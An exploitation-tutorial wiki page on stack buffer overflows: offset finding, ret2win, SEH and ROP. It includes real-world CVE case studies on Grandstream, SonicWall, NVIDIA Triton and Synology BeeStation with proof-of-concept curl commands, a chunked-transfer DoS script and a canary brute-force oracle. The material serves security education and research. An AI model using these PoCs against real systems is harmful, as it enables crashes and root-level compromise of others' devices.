_body: "# Stack Overflow\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## What is a Stack Overflow\n\nA **stack\
  \ overflow** is a vulnerability that occurs when a program writes more data to the stack than it is allocated to hold. This\
  \ excess data will **overwrite adjacent memory space**, leading to the corruption of valid data, control flow disruption,\
  \ and potentially the execution of malicious code. This issue often arises due to the use of unsafe functions that do not\
  \ perform bounds checking on input.\n\nThe main problem of this overwrite is that the **saved instruction pointer (EIP/RIP)**\
  \ and the **saved base pointer (EBP/RBP)** to return to the previous function are **stored on the stack**. Therefore, an\
  \ attacker will be able to overwrite those and **control the execution flow of the program**.\n\nThe vulnerability usually\
  \ arises because a function **copies inside the stack more bytes than the amount allocated for it**, therefore being able\
  \ to overwrite other parts of the stack.\n\nSome common functions vulnerable to this are: **`strcpy`, `strcat`, `sprintf`,\
  \ `gets`**... Also, functions like **`fgets`** , **`read` & `memcpy`** that take a **length argument**, might be used in\
  \ a vulnerable way if the specified length is greater than the allocated one.\n\nFor example, the following functions could\
  \ be vulnerable:\n\n```c\nvoid vulnerable() {\n    char buffer[128];\n    printf(\"Enter some text: \");\n    gets(buffer);\
  \ // This is where the vulnerability lies\n    printf(\"You entered: %s\\n\", buffer);\n}\n```\n\n### Finding Stack Overflows\
  \ offsets\n\nThe most common way to find stack overflows is to give a very big input of `A`s (e.g. `python3 -c 'print(\"\
  A\"*1000)'`) and expect a `Segmentation Fault` indicating that the **address `0x41414141` was tried to be accessed**.\n\n\
  Moreover, once you found that there is Stack Overflow vulnerability you will need to find the offset until it's possible\
  \ to **overwrite the return address**, for this it's usually used a **De Bruijn sequence.** Which for a given alphabet of\
  \ size _k_ and subsequences of length _n_ is a **cyclic sequence in which every possible subsequence of length _n_ appears\
  \ exactly once** as a contiguous subsequence.\n\nThis way, instead of needing to figure out which offset is needed to control\
  \ the EIP by hand, it's possible to use as padding one of these sequences and then find the offset of the bytes that ended\
  \ overwriting it.\n\nIt's possible to use **pwntools** for this:\n\n```python\nfrom pwn import *\n\n# Generate a De Bruijn\
  \ sequence of length 1000 with an alphabet size of 256 (byte values)\npattern = cyclic(1000)\n\n# This is an example value\
  \ that you'd have found in the EIP/IP register upon crash\neip_value = p32(0x6161616c)\noffset = cyclic_find(eip_value)\
  \  # Finds the offset of the sequence in the De Bruijn pattern\nprint(f\"The offset is: {offset}\")\n```\n\nor **GEF**:\n\
  \n```bash\n#Patterns\npattern create 200 #Generate length 200 pattern\npattern search \"avaaawaa\" #Search for the offset\
  \ of that substring\npattern search $rsp #Search the offset given the content of $rsp\n```\n\n## Exploiting Stack Overflows\n\
  \nDuring an overflow (supposing the overflow size if big enough) you will be able to **overwrite** values of local variables\
  \ inside the stack until reaching the saved **EBP/RBP and EIP/RIP (or even more)**.\\\nThe most common way to abuse this\
  \ type of vulnerability is by **modifying the return address** so when the function ends the **control flow will be redirected\
  \ wherever the user specified** in this pointer.\n\nHowever, in other scenarios maybe just **overwriting some variables\
  \ values in the stack** might be enough for the exploitation (like in easy CTF challenges).\n\n### Ret2win\n\nIn this type\
  \ of CTF challenges, there is a **function** **inside** the binary that is **never called** and that **you need to call\
  \ in order to win**. For these challenges you just need to find the **offset to overwrite the return address** and **find\
  \ the address of the function** to call (usually [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) would\
  \ be disabled) so when the vulnerable function returns, the hidden function will be called:\n\n\n{{#ref}}\nret2win/\n{{#endref}}\n\
  \n### Stack Shellcode\n\nIn this scenario the attacker could place a shellcode in the stack and abuse the controlled EIP/RIP\
  \ to jump to the shellcode and execute arbitrary code:\n\n\n{{#ref}}\nstack-shellcode/\n{{#endref}}\n\n### Windows SEH-based\
  \ exploitation (nSEH/SEH)\n\nOn 32-bit Windows, an overflow may overwrite the Structured Exception Handler (SEH) chain instead\
  \ of the saved return address. Exploitation typically replaces the SEH pointer with a POP POP RET gadget and uses the 4-byte\
  \ nSEH field for a short jump to pivot back into the large buffer where shellcode lives. A common pattern is a short jmp\
  \ in nSEH that lands on a 5-byte near jmp placed just before nSEH to jump hundreds of bytes back to the payload start.\n\
  \n\n{{#ref}}\nwindows-seh-overflow.md\n{{#endref}}\n\n### ROP & Ret2... techniques\n\nThis technique is the fundamental\
  \ framework to bypass the main protection to the previous technique: **No executable stack (NX)**. And it allows to perform\
  \ several other techniques (ret2lib, ret2syscall...) that will end executing arbitrary commands by abusing existing instructions\
  \ in the binary:\n\n\n{{#ref}}\n../rop-return-oriented-programing/\n{{#endref}}\n\n## Heap Overflows\n\nAn overflow is not\
  \ always going to be in the stack, it could also be in the **heap** for example:\n\n\n{{#ref}}\n../libc-heap/heap-overflow.md\n\
  {{#endref}}\n\n## Types of protections\n\nThere are several protections trying to prevent the exploitation of vulnerabilities,\
  \ check them in:\n\n\n{{#ref}}\n../common-binary-protections-and-bypasses/\n{{#endref}}\n\n### Real-World Example: CVE-2026-2329\
  \ (Grandstream GXP1600 unauthenticated HTTP stack overflow)\n\n- `/app/bin/gs_web` (32-bit ARM) exposes `/cgi-bin/api.values.get`\
  \ on TCP/80 with **no authentication**. The POST parameter `request` is colon-delimited; each character is copied into `char\
  \ small_buffer[64]` and the token is NUL-terminated on `:` or end, **without any length check**, letting a single oversized\
  \ token smash the saved registers/return address.\n- PoC overflow (crashes and shows attacker data in registers): `curl\
  \ -ik http://<target>/cgi-bin/api.values.get --data \"request=$(python3 - <<'PY'\\nprint('A'*256)\\nPY)\"`.\n- **Delimiter-driven\
  \ multi-NUL placement**: every colon restarts parsing and appends a trailing NUL. By using multiple overlong identifiers,\
  \ each token’s terminator can be aligned to a different offset in the corrupted frame, letting the attacker place **several\
  \ `0x00` bytes** even though each overflow normally adds only one. This is crucial because the non-PIE binary is mapped\
  \ at `0x00008000`, so ROP gadget addresses embed NUL bytes.\n  - Example colon payload to drop five NULs at chosen offsets\
  \ (lengths tuned per stack layout): `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:BBBBBBBBBBBBBBBBBBBBB:CCCCCCCCCCCCCCCCCCCC:DDDDDDDDDDD:EEE`\n\
  - `checksec` shows **NX enabled**, **no canary**, **no PIE**. Exploitation uses a ROP chain built from fixed addresses (e.g.,\
  \ call `system()` then `exit()`), staging arguments after planting the required NUL bytes with the delimiter trick.\n\n\
  ### Real-World Example: CVE-2025-40596 (SonicWall SMA100)\n\nA good demonstration of why **`sscanf` should never be trusted\
  \ for parsing untrusted input** appeared in 2025 in SonicWall’s SMA100 SSL-VPN appliance.  \nThe vulnerable routine inside\
  \ `/usr/src/EasyAccess/bin/httpd` attempts to extract the version and endpoint from any URI that begins with `/__api__/`:\n\
  \n```c\nchar version[3];\nchar endpoint[0x800] = {0};\n/* simplified proto-type */\nsscanf(uri, \"%*[^/]/%2s/%s\", version,\
  \ endpoint);\n```\n\n1. The first conversion (`%2s`) safely stores **two** bytes into `version` (e.g. `\"v1\"`).  \n2. The\
  \ second conversion (`%s`) **has no length specifier**, therefore `sscanf` will keep copying **until the first NUL byte**.\
  \  \n3. Because `endpoint` is located on the **stack** and is **0x800 bytes long**, providing a path longer than 0x800 bytes\
  \ corrupts everything that sits after the buffer ‑ including the **stack canary** and the **saved return address**.\n\n\
  A single-line proof-of-concept is enough to trigger the crash **before authentication**:\n\n```python\nimport requests,\
  \ warnings\nwarnings.filterwarnings('ignore')\nurl = \"https://TARGET/__api__/v1/\" + \"A\"*3000\nrequests.get(url, verify=False)\n\
  ```\n\nEven though stack canaries abort the process, an attacker still gains a **Denial-of-Service** primitive (and, with\
  \ additional information leaks, possibly code-execution).\n\n### Real-World Example: CVE-2025-23310 & CVE-2025-23311 (NVIDIA\
  \ Triton Inference Server)\n\nNVIDIA’s Triton Inference Server (≤ v25.06) contained multiple **stack-based overflows** reachable\
  \ through its HTTP API.  \nThe vulnerable pattern repeatedly appeared in `http_server.cc` and `sagemaker_server.cc`:\n\n\
  ```c\nint n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);\nif (n > 0) {\n    /* allocates 16 * n bytes on the stack\
  \ */\n    struct evbuffer_iovec *v = (struct evbuffer_iovec *)\n        alloca(sizeof(struct evbuffer_iovec) * n);\n   \
  \ ...\n}\n```\n\n1. `evbuffer_peek` (libevent) returns the **number of internal buffer segments** that compose the current\
  \ HTTP request body.\n2. Each segment causes a **16-byte** `evbuffer_iovec` to be allocated on the **stack** via `alloca()`\
  \ – **without any upper bound**.\n3. By abusing **HTTP _chunked transfer-encoding_**, a client can force the request to\
  \ be split into **hundreds-of-thousands of 6-byte chunks** (`\"1\\r\\nA\\r\\n\"`).  This makes `n` grow unbounded until\
  \ the stack is exhausted.\n\n#### Proof-of-Concept (DoS)\n<details>\n<summary>Chunked DoS PoC</summary>\n\n```python\n#!/usr/bin/env\
  \ python3\nimport socket, sys\n\ndef exploit(host=\"localhost\", port=8000, chunks=523_800):\n    s = socket.create_connection((host,\
  \ port))\n    s.sendall((\n        f\"POST /v2/models/add_sub/infer HTTP/1.1\\r\\n\"\n        f\"Host: {host}:{port}\\r\\\
  n\"\n        \"Content-Type: application/octet-stream\\r\\n\"\n        \"Inference-Header-Content-Length: 0\\r\\n\"\n  \
  \      \"Transfer-Encoding: chunked\\r\\n\"\n        \"Connection: close\\r\\n\\r\\n\"\n    ).encode())\n\n    for _ in\
  \ range(chunks):                  # 6-byte chunk ➜ 16-byte alloc\n        s.send(b\"1\\r\\nA\\r\\n\")            # amplification\
  \ factor ≈ 2.6x\n    s.sendall(b\"0\\r\\n\\r\\n\")               # end of chunks\n    s.close()\n\nif __name__ == \"__main__\"\
  :\n    exploit(*sys.argv[1:])\n```\n\n</details>\nA ~3 MB request is enough to overwrite the saved return address and **crash**\
  \ the daemon on a default build.\n\n### Real-World Example: CVE-2025-12686 (Synology BeeStation Bee-AdminCenter)\n\nSynacktiv’s\
  \ Pwn2Own 2025 chain abused a pre-auth overflow in `SYNO.BEE.AdminCenter.Auth` on port 5000. `AuthManagerImpl::ParseAuthInfo`\
  \ Base64-decodes attacker input into a 4096-byte stack buffer but wrongly sets `decoded_len = auth_info->len`. Because the\
  \ CGI worker forks per request, every child inherits the parent’s stack canary, so one stable overflow primitive is enough\
  \ to both corrupt the stack and leak all required secrets.\n\n#### Base64-decoded JSON as a structured overflow\nThe decoded\
  \ blob must be valid JSON and include `\"state\"` and `\"code\"` keys; otherwise, the parser throws before the overflow\
  \ is useful. Synacktiv solved this by Base64-encoding a payload that decodes to JSON, then a NUL byte, then the overflow\
  \ stream. `strlen(decoded)` stops at the NUL so parsing succeeds, but `SLIBCBase64Decode` already overwrote the stack past\
  \ the JSON object, covering the canary, saved RBP, and return address.\n\n```python\npld  = b'{\"code\":\"\",\"state\":\"\
  \"}\\x00'  # JSON accepted by Json::Reader\npld += b\"A\"*4081                              # reach the canary slot\npld\
  \ += marker_bytes                            # guessed canary / pointer data\nsend_request(pld)\n```\n\n#### Crash-oracle\
  \ bruteforcing of canaries & pointers\n`synoscgi` forks once per HTTP request, so all children share the same canary, stack\
  \ layout, and PIE slide. The exploit treats the HTTP status code as an oracle: a `200` response means the guessed byte preserved\
  \ the stack, while `502` (or a dropped connection) means the process crashed. Brute-forcing each byte serially recovers\
  \ the 8-byte canary, a saved stack pointer, and a return address inside `libsynobeeadmincenter.so`:\n\n```python\ndef bf_next_byte(prefix):\n\
  \    for guess in range(0x100):\n        try:\n            if send_request(prefix + bytes([guess])).status_code == 200:\n\
  \                return bytes([guess])\n        except requests.exceptions.ReadTimeout:\n            continue\n    raise\
  \ RuntimeError(\"oracle lost sync\")\n```\n\n`bf_next_ptr` simply calls `bf_next_byte` eight times while appending the confirmed\
  \ prefix. Synacktiv parallelized these oracles with ~16 worker threads, reducing the total leak time (canary + stack ptr\
  \ + lib base) to under three minutes.\n\n#### From leaks to ROP & execution\nOnce the library base is known, common gadgets\
  \ (`pop rdi`, `pop rsi`, `mov [rdi], rsi; xor eax, eax; ret`) build an `arb_write` primitive that stages `/bin/bash`, `-c`,\
  \ and the attacker command on the leaked stack address. Finally, the chain sets up the calling convention for `SLIBCExecl`\
  \ (a BeeStation wrapper around `execl(2)`), yielding a root shell without needing a separate info-leak bug.\n\n## References\n\
